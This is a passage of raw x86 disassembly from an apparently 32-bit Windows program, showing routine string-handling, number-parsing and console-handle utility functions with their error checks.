  409ad7:	call   DWORD PTR ds:0x412014
  409add:	fldz   
  409adf:	pop    edi
  409ae0:	pop    esi
  409ae1:	mov    esp,ebp
  409ae3:	pop    ebp
  409ae4:	ret    
  409ae5:	int3   
  409ae6:	int3   
  409ae7:	int3   
  409ae8:	int3   
  409ae9:	int3   
  409aea:	mov    edi,edi
  409aec:	push   ebp
  409aed:	mov    ebp,esp
  409aef:	push   ecx
  409af0:	push   esi
  409af1:	push   edi
  409af2:	mov    esi,ecx
  409af4:	xor    edi,edi
  409af6:	mov    DWORD PTR [ebp-0x4],edi
  409af9:	test   esi,esi
  409afb:	je     0x409b89
  409b01:	call   0x40920b
  409b06:	test   eax,eax
  409b08:	je     0x409b9b
  409b0e:	push   edi
  409b0f:	push   edi
  409b10:	mov    edx,esi
  409b12:	xor    ecx,ecx
  409b14:	call   0x409339
  409b19:	mov    esi,eax
  409b1b:	test   esi,esi
  409b1d:	jne    0x409b2d
  409b1f:	call   DWORD PTR ds:0x4120cc
  409b25:	test   eax,eax
  409b27:	jne    0x409b9b
  409b29:	push   0x8
  409b2b:	jmp    0x409b95
  409b2d:	push   ecx
  409b2e:	xor    edx,edx
  409b30:	mov    ecx,esi
  409b32:	call   0x409e43
  409b37:	mov    ecx,esi
  409b39:	call   0x40a30b
  409b3e:	test   eax,eax
  409b40:	je     0x409b89
  409b42:	call   DWORD PTR ds:0x412250
  409b48:	push   0xa
  409b4a:	mov    DWORD PTR [eax],edi
  409b4c:	lea    eax,[ebp-0x4]
  409b4f:	cmp    WORD PTR [esi],0x2d
  409b53:	push   eax
  409b54:	push   esi
  409b55:	jne    0x409b5f
  409b57:	call   DWORD PTR ds:0x412258
  409b5d:	jmp    0x409b65
  409b5f:	call   DWORD PTR ds:0x41225c
  409b65:	add    esp,0xc
  409b68:	mov    esi,eax
  409b6a:	call   DWORD PTR ds:0x412250
  409b70:	cmp    DWORD PTR [eax],0x22
  409b73:	je     0x409b89
  409b75:	mov    ecx,DWORD PTR [ebp-0x4]
  409b78:	test   ecx,ecx
  409b7a:	je     0x409b85
  409b7c:	call   0x40a30b
  409b81:	test   eax,eax
  409b83:	jne    0x409b89
  409b85:	mov    eax,esi
  409b87:	jmp    0x409b9d
  409b89:	call   DWORD PTR ds:0x4120cc
  409b8f:	test   eax,eax
  409b91:	jne    0x409b9b
  409b93:	push   0x57
  409b95:	call   DWORD PTR ds:0x412014
  409b9b:	xor    eax,eax
  409b9d:	pop    edi
  409b9e:	pop    esi
  409b9f:	mov    esp,ebp
  409ba1:	pop    ebp
  409ba2:	ret    
  409ba3:	int3   
  409ba4:	int3   
  409ba5:	int3   
  409ba6:	int3   
  409ba7:	int3   
  409ba8:	mov    edi,edi
  409baa:	push   ebp
  409bab:	mov    ebp,esp
  409bad:	push   ecx
  409bae:	push   esi
  409baf:	push   edi
  409bb0:	xor    edi,edi
  409bb2:	mov    DWORD PTR [ebp-0x4],edi
  409bb5:	test   ecx,ecx
  409bb7:	je     0x409c42
  409bbd:	push   edi
  409bbe:	mov    edx,ecx
  409bc0:	xor    ecx,ecx
  409bc2:	push   edi
  409bc3:	call   0x409339
  409bc8:	mov    esi,eax
  409bca:	test   esi,esi
  409bcc:	jne    0x409bdc
  409bce:	call   DWORD PTR ds:0x4120cc
  409bd4:	test   eax,eax
  409bd6:	jne    0x409c54
  409bd8:	push   0x8
  409bda:	jmp    0x409c4e
  409bdc:	push   ecx
  409bdd:	xor    edx,edx
  409bdf:	mov    ecx,esi
  409be1:	call   0x409e43
  409be6:	mov    ecx,esi
  409be8:	call   0x40a30b
  409bed:	test   eax,eax
  409bef:	je     0x409c54
  409bf1:	cmp    DWORD PTR [ebp+0x8],edi
  409bf4:	jne    0x409bfc
  409bf6:	cmp    WORD PTR [esi],0x2d
  409bfa:	je     0x409c54
  409bfc:	call   DWORD PTR ds:0x412250
  409c02:	cmp    DWORD PTR [ebp+0x8],0x1
  409c06:	push   0xa
  409c08:	mov    DWORD PTR [eax],edi
  409c0a:	lea    eax,[ebp-0x4]
  409c0d:	push   eax
  409c0e:	push   esi
  409c0f:	jne    0x409c19
  409c11:	call   DWORD PTR ds:0x412258
  409c17:	jmp    0x409c1f
  409c19:	call   DWORD PTR ds:0x41225c
  409c1f:	add    esp,0xc
  409c22:	call   DWORD PTR ds:0x412250
  409c28:	cmp    DWORD PTR [eax],0x22
  409c2b:	je     0x409c54
  409c2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409c30:	test   ecx,ecx
  409c32:	je     0x409c3d
  409c34:	call   0x40a30b
  409c39:	test   eax,eax
  409c3b:	jne    0x409c54
  409c3d:	xor    eax,eax
  409c3f:	inc    eax
  409c40:	jmp    0x409c56
  409c42:	call   DWORD PTR ds:0x4120cc
  409c48:	test   eax,eax
  409c4a:	jne    0x409c54
  409c4c:	push   0x57
  409c4e:	call   DWORD PTR ds:0x412014
  409c54:	xor    eax,eax
  409c56:	pop    edi
  409c57:	pop    esi
  409c58:	mov    esp,ebp
  409c5a:	pop    ebp
  409c5b:	ret    0x4
  409c5e:	int3   
  409c5f:	int3   
  409c60:	int3   
  409c61:	int3   
  409c62:	int3   
  409c63:	mov    edi,edi
  409c65:	push   esi
  409c66:	mov    esi,ecx
  409c68:	push   edi
  409c69:	mov    edi,edx
  409c6b:	test   esi,esi
  409c6d:	jne    0x409c7d
  409c6f:	call   DWORD PTR ds:0x4120cc
  409c75:	test   eax,eax
  409c77:	jne    0x409ca3
  409c79:	push   0x57
  409c7b:	jmp    0x409c9d
  409c7d:	call   0x40a30b
  409c82:	test   eax,eax
  409c84:	je     0x409c98
  409c86:	push   edi
  409c87:	push   esi
  409c88:	call   DWORD PTR ds:0x412128
  409c8e:	test   eax,eax
  409c90:	je     0x409c98
  409c92:	sub    eax,esi
  409c94:	sar    eax,1
  409c96:	jmp    0x409ca6
  409c98:	push   0x490
  409c9d:	call   DWORD PTR ds:0x412014
  409ca3:	or     eax,0xffffffff
  409ca6:	pop    edi
  409ca7:	pop    esi
  409ca8:	ret    0x8
  409cab:	int3   
  409cac:	int3   
  409cad:	int3   
  409cae:	int3   
  409caf:	int3   
  409cb0:	mov    edi,edi
  409cb2:	push   ebp
  409cb3:	mov    ebp,esp
  409cb5:	sub    esp,0xc
  409cb8:	push   ebx
  409cb9:	push   esi
  409cba:	push   edi
  409cbb:	mov    edi,ecx
  409cbd:	mov    esi,edx
  409cbf:	test   edi,edi
  409cc1:	je     0x409d6f
  409cc7:	test   esi,esi
  409cc9:	je     0x409d6f
  409ccf:	mov    ecx,esi
  409cd1:	call   0x40a30b
  409cd6:	push   0x1
  409cd8:	xor    edx,edx
  409cda:	xor    ecx,ecx
  409cdc:	lea    ebx,[eax+0x4]
  409cdf:	push   ebx
  409ce0:	call   0x409339
  409ce5:	mov    DWORD PTR [ebp-0x4],eax
  409ce8:	test   eax,eax
  409cea:	jne    0x409cfe
  409cec:	call   DWORD PTR ds:0x4120cc
  409cf2:	test   eax,eax
  409cf4:	jne    0x409d81
  409cfa:	push   0x8
  409cfc:	jmp    0x409d7b
  409cfe:	mov    ecx,edi
  409d00:	call   0x40a30b
  409d05:	add    eax,0x4
  409d08:	xor    ecx,ecx
  409d0a:	push   0x1
  409d0c:	push   eax
  409d0d:	xor    edx,edx
  409d0f:	mov    DWORD PTR [ebp-0x8],eax
  409d12:	inc    ecx
  409d13:	call   0x409339
  409d18:	mov    DWORD PTR [ebp-0xc],eax
  409d1b:	test   eax,eax
  409d1d:	je     0x409cec
  409d1f:	push   esi
  409d20:	mov    esi,DWORD PTR [ebp-0x4]
  409d23:	push   0x401a84
  409d28:	push   ebx
  409d29:	push   esi
  409d2a:	call   0x40adea
  409d2f:	add    esp,0x10
  409d32:	test   eax,eax
  409d34:	jns    0x409d3c
  409d36:	movzx  eax,ax
  409d39:	push   eax
  409d3a:	jmp    0x409d7b
  409d3c:	push   edi
  409d3d:	mov    edi,DWORD PTR [ebp-0xc]
  409d40:	push   0x401a84
  409d45:	push   DWORD PTR [ebp-0x8]
  409d48:	push   edi
  409d49:	call   0x40adea
  409d4e:	add    esp,0x10
  409d51:	test   eax,eax
  409d53:	js     0x409d36
  409d55:	push   0x0
  409d57:	push   DWORD PTR [ebp+0x8]
  409d5a:	mov    edx,edi
  409d5c:	mov    ecx,esi
  409d5e:	call   0x409d91
  409d63:	xor    ecx,ecx
  409d65:	cmp    eax,0xffffffff
  409d68:	setne  cl
  409d6b:	mov    eax,ecx
  409d6d:	jmp    0x409d83
  409d6f:	call   DWORD PTR ds:0x4120cc
  409d75:	test   eax,eax
  409d77:	jne    0x409d81
  409d79:	push   0x57
  409d7b:	call   DWORD PTR ds:0x412014
  409d81:	xor    eax,eax
  409d83:	pop    edi
  409d84:	pop    esi
  409d85:	pop    ebx
  409d86:	mov    esp,ebp
  409d88:	pop    ebp
  409d89:	ret    0x4
  409d8c:	int3   
  409d8d:	int3   
  409d8e:	int3   
  409d8f:	int3   
  409d90:	int3   
  409d91:	mov    edi,edi
  409d93:	push   ebp
  409d94:	mov    ebp,esp
  409d96:	push   ebx
  409d97:	push   esi
  409d98:	mov    esi,ecx
  409d9a:	mov    ebx,edx
  409d9c:	push   edi
  409d9d:	test   esi,esi
  409d9f:	je     0x409df2
  409da1:	test   ebx,ebx
  409da3:	je     0x409df2
  409da5:	call   0x40a30b
  409daa:	mov    ecx,ebx
  409dac:	mov    edi,eax
  409dae:	call   0x40a30b
  409db3:	test   eax,eax
  409db5:	je     0x409de5
  409db7:	test   edi,edi
  409db9:	je     0x409de5
  409dbb:	mov    ecx,DWORD PTR [ebp+0xc]
  409dbe:	cmp    ecx,edi
  409dc0:	jae    0x409de5
  409dc2:	sub    edi,ecx
  409dc4:	cmp    edi,eax
  409dc6:	jb     0x409de5
  409dc8:	cmp    DWORD PTR [ebp+0x8],0x1
  409dcc:	lea    eax,[esi+ecx*2]
  409dcf:	push   ebx
  409dd0:	push   eax
  409dd1:	jne    0x409ddb
  409dd3:	call   DWORD PTR ds:0x412120
  409dd9:	jmp    0x409de1
  409ddb:	call   DWORD PTR ds:0x412124
  409de1:	test   eax,eax
  409de3:	jne    0x409dec
  409de5:	push   0x490
  409dea:	jmp    0x409dfe
  409dec:	sub    eax,esi
  409dee:	sar    eax,1
  409df0:	jmp    0x409e07
  409df2:	call   DWORD PTR ds:0x4120cc
  409df8:	test   eax,eax
  409dfa:	jne    0x409e04
  409dfc:	push   0x57
  409dfe:	call   DWORD PTR ds:0x412014
  409e04:	or     eax,0xffffffff
  409e07:	pop    edi
  409e08:	pop    esi
  409e09:	pop    ebx
  409e0a:	pop    ebp
  409e0b:	ret    0x8
  409e0e:	int3   
  409e0f:	int3   
  409e10:	int3   
  409e11:	int3   
  409e12:	int3   
  409e13:	mov    edi,edi
  409e15:	push   esi
  409e16:	mov    esi,ecx
  409e18:	test   esi,esi
  409e1a:	je     0x409e3a
  409e1c:	call   0x40a30b
  409e21:	test   eax,eax
  409e23:	je     0x409e3a
  409e25:	xor    eax,eax
  409e27:	push   eax
  409e28:	push   eax
  409e29:	push   eax
  409e2a:	push   eax
  409e2b:	push   0xffffffff
  409e2d:	push   esi
  409e2e:	push   eax
  409e2f:	push   0x1
  409e31:	call   DWORD PTR ds:0x412090
  409e37:	dec    eax
  409e38:	pop    esi
  409e39:	ret    
  409e3a:	xor    eax,eax
  409e3c:	pop    esi
  409e3d:	ret    
  409e3e:	int3   
  409e3f:	int3   
  409e40:	int3   
  409e41:	int3   
  409e42:	int3   
  409e43:	mov    edi,edi
  409e45:	push   ebp
  409e46:	mov    ebp,esp
  409e48:	sub    esp,0x18
  409e4b:	mov    eax,ds:0x411004
  409e50:	xor    eax,ebp
  409e52:	mov    DWORD PTR [ebp-0x4],eax
  409e55:	push   ebx
  409e56:	xor    eax,eax
  409e58:	push   esi
  409e59:	mov    ebx,eax
  409e5b:	mov    esi,edx
  409e5d:	mov    eax,ds:0x401a90
  409e62:	push   edi
  409e63:	mov    edi,ecx
  409e65:	mov    DWORD PTR [ebp-0xc],eax
  409e68:	mov    ax,ds:0x401a94
  409e6e:	mov    DWORD PTR [ebp-0x10],esi
  409e71:	mov    DWORD PTR [ebp-0x18],edi
  409e74:	mov    DWORD PTR [ebp-0x14],ebx
  409e77:	mov    WORD PTR [ebp-0x8],ax
  409e7b:	test   edi,edi
  409e7d:	je     0x409f2a
  409e83:	call   0x40a30b
  409e88:	test   eax,eax
  409e8a:	je     0x409f2a
  409e90:	test   esi,esi
  409e92:	je     0x409e9f
  409e94:	mov    ecx,esi
  409e96:	call   0x40a30b
  409e9b:	test   eax,eax
  409e9d:	jne    0x409ea5
  409e9f:	lea    eax,[ebp-0xc]
  409ea2:	mov    DWORD PTR [ebp-0x10],eax
  409ea5:	xor    eax,eax
  409ea7:	mov    esi,edi
  409ea9:	cmp    WORD PTR [edi],ax
  409eac:	je     0x409ed0
  409eae:	mov    ebx,DWORD PTR [ebp-0x10]
  409eb1:	xor    edi,edi
  409eb3:	movzx  eax,WORD PTR [esi]
  409eb6:	push   eax
  409eb7:	push   ebx
  409eb8:	call   DWORD PTR ds:0x41211c
  409ebe:	test   eax,eax
  409ec0:	je     0x409eca
  409ec2:	add    esi,0x2
  409ec5:	cmp    WORD PTR [esi],di
  409ec8:	jne    0x409eb3
  409eca:	mov    edi,DWORD PTR [ebp-0x18]
  409ecd:	mov    ebx,DWORD PTR [ebp-0x14]
  409ed0:	movzx  eax,WORD PTR [esi]
  409ed3:	mov    DWORD PTR [ebp-0x14],esi
  409ed6:	test   ax,ax
  409ed9:	je     0x409f0d
  409edb:	mov    edi,DWORD PTR [ebp-0x10]
  409ede:	push   eax
  409edf:	push   edi
  409ee0:	call   DWORD PTR ds:0x41211c
  409ee6:	test   eax,eax
  409ee8:	je     0x409ef2
  409eea:	test   ebx,ebx
  409eec:	jne    0x409ef6
  409eee:	mov    ebx,esi
  409ef0:	jmp    0x409ef6
  409ef2:	xor    eax,eax
  409ef4:	mov    ebx,eax
  409ef6:	add    esi,0x2
  409ef9:	movzx  eax,WORD PTR [esi]
  409efc:	test   ax,ax
  409eff:	jne    0x409ede
  409f01:	mov    edi,DWORD PTR [ebp-0x18]
  409f04:	test   ebx,ebx
  409f06:	je     0x409f0d
  409f08:	xor    eax,eax
  409f0a:	mov    WORD PTR [ebx],ax
  409f0d:	mov    ebx,DWORD PTR [ebp-0x14]
  409f10:	cmp    ebx,edi
  409f12:	jbe    0x409f26
  409f14:	mov    ecx,ebx
  409f16:	call   0x40a30b
  409f1b:	inc    eax
  409f1c:	mov    edx,ebx
  409f1e:	push   eax
  409f1f:	mov    ecx,edi
  409f21:	call   0x40a26c
  409f26:	mov    eax,edi
  409f28:	jmp    0x409f2f
  409f2a:	mov    eax,0x401ab8
  409f2f:	mov    ecx,DWORD PTR [ebp-0x4]
  409f32:	pop    edi
  409f33:	pop    esi
  409f34:	xor    ecx,ebp
  409f36:	pop    ebx
  409f37:	call   0x40e2c0
  409f3c:	mov    esp,ebp
  409f3e:	pop    ebp
  409f3f:	ret    0x4
  409f42:	int3   
  409f43:	int3   
  409f44:	int3   
  409f45:	int3   
  409f46:	int3   
  409f47:	mov    edi,edi
  409f49:	push   ebp
  409f4a:	mov    ebp,esp
  409f4c:	sub    esp,0x20
  409f4f:	mov    eax,ds:0x411004
  409f54:	xor    eax,ebp
  409f56:	mov    DWORD PTR [ebp-0x4],eax
  409f59:	push   ebx
  409f5a:	xor    eax,eax
  409f5c:	mov    ebx,ecx
  409f5e:	mov    DWORD PTR [ebp-0x1c],ebx
  409f61:	mov    DWORD PTR [ebp-0x10],eax
  409f64:	mov    DWORD PTR [ebp-0xc],eax
  409f67:	mov    WORD PTR [ebp-0x8],ax
  409f6b:	push   esi
  409f6c:	mov    esi,edx
  409f6e:	mov    DWORD PTR [ebp-0x20],esi
  409f71:	test   ebx,ebx
  409f73:	jne    0x409f91
  409f75:	call   DWORD PTR ds:0x4120cc
  409f7b:	test   eax,eax
  409f7d:	jne    0x409f87
  409f7f:	push   0x57
  409f81:	call   DWORD PTR ds:0x412014
  409f87:	mov    eax,0x401ab8
  409f8c:	jmp    0x40a0b3
  409f91:	call   0x409e13
  409f96:	mov    DWORD PTR [ebp-0x18],eax
  409f99:	cmp    eax,esi
  409f9b:	ja     0x409f9f
  409f9d:	mov    eax,esi
  409f9f:	push   edi
  409fa0:	lea    edi,[eax+0xa]
  409fa3:	xor    edx,edx
  409fa5:	push   0x1
  409fa7:	push   edi
  409fa8:	xor    ecx,ecx
  409faa:	call   0x409339
  409faf:	mov    ecx,eax
  409fb1:	mov    DWORD PTR [ebp-0x14],ecx
  409fb4:	test   ecx,ecx
  409fb6:	je     0x409fd3
  409fb8:	cmp    DWORD PTR [ebp-0x18],esi
  409fbb:	jae    0x40a02b
  409fbd:	push   0x1
  409fbf:	xor    ecx,ecx
  409fc1:	xor    edx,edx
  409fc3:	push   edi
  409fc4:	inc    ecx
  409fc5:	call   0x409339
  409fca:	mov    ecx,eax
  409fcc:	mov    DWORD PTR [ebp-0x10],ecx
  409fcf:	test   ecx,ecx
  409fd1:	jne    0x409fef
  409fd3:	call   DWORD PTR ds:0x4120cc
  409fd9:	test   eax,eax
  409fdb:	jne    0x409fe5
  409fdd:	push   0x8
  409fdf:	call   DWORD PTR ds:0x412014
  409fe5:	mov    eax,0x401ab8
  409fea:	jmp    0x40a0b2
  409fef:	mov    eax,esi
  409ff1:	mov    edx,0x40185c
  409ff6:	sub    eax,DWORD PTR [ebp-0x18]
  409ff9:	push   edi
  409ffa:	push   eax
  409ffb:	call   0x40a0ca
  40a000:	cmp    DWORD PTR [ebp+0x8],0x1
  40a004:	mov    ecx,DWORD PTR [ebp-0x14]
  40a007:	push   edi
  40a008:	jne    0x40a016
  40a00a:	mov    edx,DWORD PTR [ebp-0x10]
  40a00d:	call   0x40a26c
  40a012:	mov    edx,ebx
  40a014:	jmp    0x40a020
  40a016:	mov    edx,ebx
  40a018:	call   0x40a26c
  40a01d:	mov    edx,DWORD PTR [ebp-0x10]
  40a020:	mov    ecx,DWORD PTR [ebp-0x14]
  40a023:	push   edi
  40a024:	call   0x40a2d1
  40a029:	jmp    0x40a0a2
  40a02b:	test   esi,esi
  40a02d:	je     0x40a0a2
  40a02f:	mov    edx,ebx
  40a031:	mov    ebx,DWORD PTR [ebp-0x14]
  40a034:	mov    DWORD PTR [ebp-0x18],edx
  40a037:	push   0x2
  40a039:	lea    ecx,[ebp-0xc]
  40a03c:	call   0x40a26c
  40a041:	lea    ecx,[ebp-0xc]
  40a044:	call   0x409e13
  40a049:	mov    ecx,eax
  40a04b:	mov    eax,DWORD PTR [ebp-0x10]
  40a04e:	add    ecx,eax
  40a050:	mov    DWORD PTR [ebp-0x10],ecx
  40a053:	cmp    ecx,esi
  40a055:	ja     0x40a077
  40a057:	push   edi
  40a058:	lea    edx,[ebp-0xc]
  40a05b:	mov    ecx,ebx
  40a05d:	call   0x40a2d1
  40a062:	mov    edx,DWORD PTR [ebp-0x18]
  40a065:	mov    ecx,DWORD PTR [ebp-0x10]
  40a068:	add    edx,0x2
  40a06b:	mov    DWORD PTR [ebp-0x10],ecx
  40a06e:	mov    eax,ecx
  40a070:	mov    DWORD PTR [ebp-0x18],edx
  40a073:	cmp    ecx,esi
  40a075:	jb     0x40a037
  40a077:	mov    ebx,DWORD PTR [ebp-0x1c]
  40a07a:	cmp    eax,esi
  40a07c:	jae    0x40a0a2
  40a07e:	mov    ebx,DWORD PTR [ebp-0x14]
  40a081:	mov    ecx,esi
  40a083:	sub    ecx,eax
  40a085:	mov    DWORD PTR [ebp-0x10],ecx
  40a088:	mov    esi,ecx
  40a08a:	push   edi
  40a08b:	mov    edx,0x40185c
  40a090:	mov    ecx,ebx
  40a092:	call   0x40a2d1
  40a097:	sub    esi,0x1
  40a09a:	jne    0x40a08a
  40a09c:	mov    esi,DWORD PTR [ebp-0x20]
  40a09f:	mov    ebx,DWORD PTR [ebp-0x1c]
  40a0a2:	mov    edx,DWORD PTR [ebp-0x14]
  40a0a5:	lea    ecx,[esi+0x1]
  40a0a8:	push   ecx
  40a0a9:	mov    ecx,ebx
  40a0ab:	call   0x40a26c
  40a0b0:	mov    eax,ebx
  40a0b2:	pop    edi
  40a0b3:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0b6:	pop    esi
  40a0b7:	xor    ecx,ebp
  40a0b9:	pop    ebx
  40a0ba:	call   0x40e2c0
  40a0bf:	mov    esp,ebp
  40a0c1:	pop    ebp
  40a0c2:	ret    0x4
  40a0c5:	int3   
  40a0c6:	int3   
  40a0c7:	int3   
  40a0c8:	int3   
  40a0c9:	int3   
  40a0ca:	mov    edi,edi
  40a0cc:	push   ebp
  40a0cd:	mov    ebp,esp
  40a0cf:	push   ebx
  40a0d0:	push   esi
  40a0d1:	mov    esi,ecx
  40a0d3:	mov    ebx,edx
  40a0d5:	test   esi,esi
  40a0d7:	je     0x40a10d
  40a0d9:	test   ebx,ebx
  40a0db:	je     0x40a10d
  40a0dd:	push   edi
  40a0de:	push   DWORD PTR [ebp+0xc]
  40a0e1:	mov    edx,0x401ab8
  40a0e6:	call   0x40a26c
  40a0eb:	xor    edi,edi
  40a0ed:	cmp    DWORD PTR [ebp+0x8],edi
  40a0f0:	jbe    0x40a108
  40a0f2:	push   DWORD PTR [ebp+0xc]
  40a0f5:	mov    edx,ebx
  40a0f7:	mov    ecx,esi
  40a0f9:	call   0x40a2d1
  40a0fe:	test   eax,eax
  40a100:	je     0x40a108
  40a102:	inc    edi
  40a103:	cmp    edi,DWORD PTR [ebp+0x8]
  40a106:	jb     0x40a0f2
  40a108:	mov    eax,esi
  40a10a:	pop    edi
  40a10b:	jmp    0x40a124
  40a10d:	call   DWORD PTR ds:0x4120cc
  40a113:	test   eax,eax
  40a115:	jne    0x40a11f
  40a117:	push   0x57
  40a119:	call   DWORD PTR ds:0x412014
  40a11f:	mov    eax,0x401ab8
  40a124:	pop    esi
  40a125:	pop    ebx
  40a126:	pop    ebp
  40a127:	ret    0x8
  40a12a:	int3   
  40a12b:	int3   
  40a12c:	int3   
  40a12d:	int3   
  40a12e:	int3   
  40a12f:	mov    edi,edi
  40a131:	push   esi
  40a132:	mov    esi,ecx
  40a134:	push   edi
  40a135:	mov    edi,edx
  40a137:	test   esi,esi
  40a139:	je     0x40a15d
  40a13b:	cmp    esi,0xffffffff
  40a13e:	je     0x40a15d
  40a140:	push   esi
  40a141:	call   DWORD PTR ds:0x41208c
  40a147:	cmp    eax,0x2
  40a14a:	jne    0x40a15d
  40a14c:	push   edi
  40a14d:	push   esi
  40a14e:	call   DWORD PTR ds:0x412088
  40a154:	test   eax,eax
  40a156:	je     0x40a15d
  40a158:	xor    eax,eax
  40a15a:	inc    eax
  40a15b:	jmp    0x40a15f
  40a15d:	xor    eax,eax
  40a15f:	pop    edi
  40a160:	pop    esi
  40a161:	ret    
  40a162:	int3   
  40a163:	int3   
  40a164:	int3   
  40a165:	int3   
  40a166:	int3   
  40a167:	mov    edi,edi
  40a169:	push   ebp
  40a16a:	mov    ebp,esp
  40a16c:	push   ecx
  40a16d:	push   edi
  40a16e:	xor    edi,edi
  40a170:	mov    DWORD PTR [ebp-0x4],edi
  40a173:	test   ecx,ecx
  40a175:	jne    0x40a18d
  40a177:	call   DWORD PTR ds:0x4120cc
  40a17d:	test   eax,eax
  40a17f:	jne    0x40a189
  40a181:	push   0x57
  40a183:	call   DWORD PTR ds:0x412014
  40a189:	xor    eax,eax
  40a18b:	jmp    0x40a1ff
  40a18d:	push   ebx
  40a18e:	push   esi
  40a18f:	push   ecx
  40a190:	call   DWORD PTR ds:0x412260
  40a196:	mov    esi,eax
  40a198:	call   DWORD PTR ds:0x412250
  40a19e:	push   esi
  40a19f:	mov    DWORD PTR [eax],edi
  40a1a1:	call   DWORD PTR ds:0x412264
  40a1a7:	mov    ebx,eax
  40a1a9:	pop    ecx
  40a1aa:	pop    ecx
  40a1ab:	cmp    ebx,0xffffffff
  40a1ae:	je     0x40a1f3
  40a1b0:	call   DWORD PTR ds:0x412250
  40a1b6:	cmp    DWORD PTR [eax],0x9
  40a1b9:	je     0x40a1f3
  40a1bb:	push   ebx
  40a1bc:	call   DWORD PTR ds:0x41208c
  40a1c2:	cmp    eax,0x2
  40a1c5:	jne    0x40a1fb
  40a1c7:	sub    esi,edi
  40a1c9:	je     0x40a1dd
  40a1cb:	sub    esi,0x1
  40a1ce:	je     0x40a1d9
  40a1d0:	sub    esi,0x1
  40a1d3:	jne    0x40a1e7
  40a1d5:	push   0xfffffff4
  40a1d7:	jmp    0x40a1df
  40a1d9:	push   0xfffffff5
  40a1db:	jmp    0x40a1df
  40a1dd:	push   0xfffffff6
  40a1df:	call   DWORD PTR ds:0x41202c
  40a1e5:	mov    edi,eax
  40a1e7:	lea    edx,[ebp-0x4]
  40a1ea:	mov    ecx,edi
  40a1ec:	call   0x40a12f
  40a1f1:	jmp    0x40a1fd
  40a1f3:	push   0x6
  40a1f5:	call   DWORD PTR ds:0x412014
  40a1fb:	xor    eax,eax
  40a1fd:	pop    esi
  40a1fe:	pop    ebx
  40a1ff:	pop    edi
  40a200:	mov    esp,ebp
  40a202:	pop    ebp
  40a203:	ret    
  40a204:	int3   
  40a205:	int3   
  40a206:	int3   
  40a207:	int3   
  40a208:	int3   
  40a209:	mov    edi,edi
  40a20b:	push   ebp
  40a20c:	mov    ebp,esp
  40a20e:	push   esi
  40a20f:	mov    esi,ecx
  40a211:	test   esi,esi
  40a213:	je     0x40a25b
  40a215:	test   edx,edx
  40a217:	je     0x40a25b
  40a219:	mov    eax,DWORD PTR [ebp+0x8]
  40a21c:	test   eax,eax
  40a21e:	jle    0x40a25b
  40a220:	xor    ecx,ecx
  40a222:	test   eax,eax
  40a224:	je     0x40a22d
  40a226:	cmp    eax,0x7fffffff
  40a22b:	jbe    0x40a232
  40a22d:	mov    ecx,0x80070057
  40a232:	test   ecx,ecx
  40a234:	js     0x40a246
  40a236:	push   ecx
  40a237:	push   edx
  40a238:	push   ecx
  40a239:	mov    edx,eax
  40a23b:	mov    ecx,esi
  40a23d:	call   0x40ada3
  40a242:	mov    ecx,eax
  40a244:	jmp    0x40a24d
  40a246:	test   eax,eax
  40a248:	je     0x40a24d
  40a24a:	mov    BYTE PTR [esi],0x0
  40a24d:	test   ecx,ecx
  40a24f:	jns    0x40a262
  40a251:	movzx  eax,cx
  40a254:	push   eax
  40a255:	call   DWORD PTR ds:0x412014
  40a25b:	xor    eax,eax
  40a25d:	pop    esi
  40a25e:	pop    ebp
  40a25f:	ret    0x4
  40a262:	xor    eax,eax
  40a264:	inc    eax
  40a265:	jmp    0x40a25d
  40a267:	int3   
  40a268:	int3   
  40a269:	int3   
  40a26a:	int3   
  40a26b:	int3   
  40a26c:	mov    edi,edi
  40a26e:	push   ebp
  40a26f:	mov    ebp,esp
  40a271:	push   esi
  40a272:	mov    esi,ecx
  40a274:	test   esi,esi
  40a276:	je     0x40a2c0
  40a278:	test   edx,edx
  40a27a:	je     0x40a2c0
  40a27c:	mov    eax,DWORD PTR [ebp+0x8]
  40a27f:	test   eax,eax
  40a281:	jle    0x40a2c0
  40a283:	xor    ecx,ecx
  40a285:	test   eax,eax
  40a287:	je     0x40a290
  40a289:	cmp    eax,0x7fffffff
  40a28e:	jbe    0x40a295
  40a290:	mov    ecx,0x80070057
  40a295:	test   ecx,ecx
  40a297:	js     0x40a2a9
  40a299:	push   ecx
  40a29a:	push   edx
  40a29b:	push   ecx
  40a29c:	mov    edx,eax
  40a29e:	mov    ecx,esi
  40a2a0:	call   0x40ad53
  40a2a5:	mov    ecx,eax
  40a2a7:	jmp    0x40a2b2
  40a2a9:	test   eax,eax
  40a2ab:	je     0x40a2b2
  40a2ad:	xor    eax,eax
  40a2af:	mov    WORD PTR [esi],ax
  40a2b2:	test   ecx,ecx
  40a2b4:	jns    0x40a2c7
  40a2b6:	movzx  eax,cx
  40a2b9:	push   eax
  40a2ba:	call   DWORD PTR ds:0x412014
  40a2c0:	xor    eax,eax
  40a2c2:	pop    esi
  40a2c3:	pop    ebp
  40a2c4:	ret    0x4
  40a2c7:	xor    eax,eax
  40a2c9:	inc    eax
  40a2ca:	jmp    0x40a2c2
  40a2cc:	int3   
  40a2cd:	int3   
  40a2ce:	int3   
  40a2cf:	int3   
  40a2d0:	int3   
  40a2d1:	mov    edi,edi
  40a2d3:	push   ebp
  40a2d4:	mov    ebp,esp
  40a2d6:	mov    eax,edx
  40a2d8:	test   ecx,ecx
  40a2da:	je     0x40a2fb
  40a2dc:	test   eax,eax
  40a2de:	je     0x40a2fb
  40a2e0:	mov    edx,DWORD PTR [ebp+0x8]
  40a2e3:	test   edx,edx
  40a2e5:	jle    0x40a2fb
  40a2e7:	push   eax
  40a2e8:	call   0x40ace7
  40a2ed:	test   eax,eax
  40a2ef:	jns    0x40a301
  40a2f1:	movzx  eax,ax
  40a2f4:	push   eax
  40a2f5:	call   DWORD PTR ds:0x412014
  40a2fb:	xor    eax,eax
  40a2fd:	pop    ebp
  40a2fe:	ret    0x4
  40a301:	xor    eax,eax
  40a303:	inc    eax
  40a304:	jmp    0x40a2fd
  40a306:	int3   
  40a307:	int3   
  40a308:	int3   
  40a309:	int3   
  40a30a:	int3   
  40a30b:	test   ecx,ecx
  40a30d:	jne    0x40a312
  40a30f:	xor    eax,eax
  40a311:	ret    
  40a312:	push   ecx
  40a313:	call   DWORD PTR ds:0x4120c4
  40a319:	ret    
  40a31a:	int3   
  40a31b:	int3   
  40a31c:	int3   
  40a31d:	int3   
  40a31e:	int3   
  40a31f:	mov    edi,edi
  40a321:	push   ebp
  40a322:	mov    ebp,esp
  40a324:	push   esi
  40a325:	mov    esi,ecx
